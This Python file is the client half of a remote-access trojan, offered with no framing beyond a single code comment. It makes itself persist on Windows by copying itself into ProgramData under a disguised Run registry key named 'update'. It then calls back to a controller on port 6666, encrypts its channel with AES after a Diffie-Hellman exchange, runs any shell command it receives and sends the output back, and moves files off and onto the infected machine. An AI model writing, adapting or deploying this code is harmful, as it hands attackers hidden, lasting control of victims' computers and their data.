import sys
import subprocess
import socket
import os
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
import hashlib

def persistence():
    if os.name == "nt":
        while True:
            if "DataApp" not in os.listdir("C:\\ProgramData"):
                os.mkdir("C:\\ProgramData\\DataApp")
                os.mkdir("C:\\ProgramData\\DataApp\\OSFiles")
                subprocess.call(f"copy {os.getcwd()}\\(filename) C:\\ProgramData\\DataApp\\OSFiles", shell = "True")
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "C:\\ProgramData\\DataApp\\OSFiles\\(filename)"', shell = "True")
                sys.exit()
            else:
                break
    else:
        pass

def socket_creation():    
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            s.connect((socket.gethostbyname(socket.gethostname()),6666)) #set this to the server.py
            break      
        except:
            pass

def func(): 
    try:
        while True:
            try:
                data = s.recv(1024)
                data = unpad(decryptcipher.decrypt(data),32).decode("utf-8")
            except:
                if data[len(data)-2:] == b'iv':
                    pass
                else:
                    data = data.decode("utf-8")
            if data == "get os":
                os_name = os.name.encode("utf-8")
                s.send(cipher.encrypt(pad(os_name,32)))
            elif data[len(data)-2:] == b'iv':
                iv = data[:len(data)-2]
                cipher = AES.new(key,AES.MODE_CBC,iv)
                decryptcipher = AES.new(key,AES.MODE_CBC,iv)
            elif data == " ":
                s.send(" ".encode("utf-8"))
            elif "$@" in data:
                data = data.split("$@")
                p = int(data[0])
                g = int(data[1])
                b = secrets.randbelow(100000000)
                gb = pow(g,b,p)
                gb = str(gb) 
                ga = int(data[2])
                gab = pow(ga,b,p)
                s.send(gb.encode("utf-8"))
                key = hashlib.sha256(str(gab).encode("utf-8")).digest()
            elif len(data) > 0:
                if data[:2] == "cd":
                    os.chdir(data[3:])
                    output1 = f'{os.getcwd()}>'.encode("utf-8")
                    s.send(cipher.encrypt(pad(output1,32)))
                elif data == "download_file":
                    try:
                        tester = s.recv(1024)
                        tester = unpad(decryptcipher.decrypt(tester),32).decode("utf-8")
                        x = open(tester,"rb")
                        f = x.read(32)                    
                        while (f):
                            if not f:
                                x.close()
                            elif len(f) % 32 == 0:
                                encryption = cipher.encrypt(f)
                                s.send(encryption)
                            elif len(f) % 32 != 0:
                                f = pad(f,32)
                                s.send(cipher.encrypt(f))
                            else:
                                pass
                            f = x.read(32)                         
                    except:
                        pass
                elif data == "send_file":                   
                    x = s.recv(1024)
                    x = unpad(decryptcipher.decrypt(x),32).decode("utf-8")
                    new_file = open(x,"wb")                                               
                    while True: 
                        try:
                            s.settimeout(1)
                            data = s.recv(32)  
                            if len(data) % 32 == 0:
                                decryptor = decryptcipher.decrypt(data)
                                new_file.write(decryptor)
                            elif len(data) % 32 != 0:
                                decryptor = decryptcipher.decrypt(data)
                                data = unpad(decryptor,32)
                                new_file.write(data)
                            else:
                                pass
                        except:
                            new_file.close()
                            s.settimeout(0)
                            s.setblocking(1)
                            break
                else: 
                    cmd1 = subprocess.Popen(data,shell = "True", stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
                    if len(cmd1.stdout.read()) != 0:
                        cmd1 = subprocess.Popen(data,shell = "True", stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
                        if len(cmd1.stdout.read()) != 0:
                            cmd = subprocess.Popen(data,shell = "True", stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
                            v = bytes(cmd.stdout.read() + cmd.stderr.read())
                            encrypted = cipher.encrypt(pad(v,32))
                            s.send(encrypted)
                        else:
                            s.send(cipher.encrypt(pad("Command executed".encode("utf-8"),32))) 
                    else:
                        s.send(cipher.encrypt(pad("Command executed".encode("utf-8"),32)))            
            else:
                pass
    except:
        try:
            socket_creation()
            func()
        except:
            print("Error has been encountered")
            
socket_creation()
persistence()
func()     
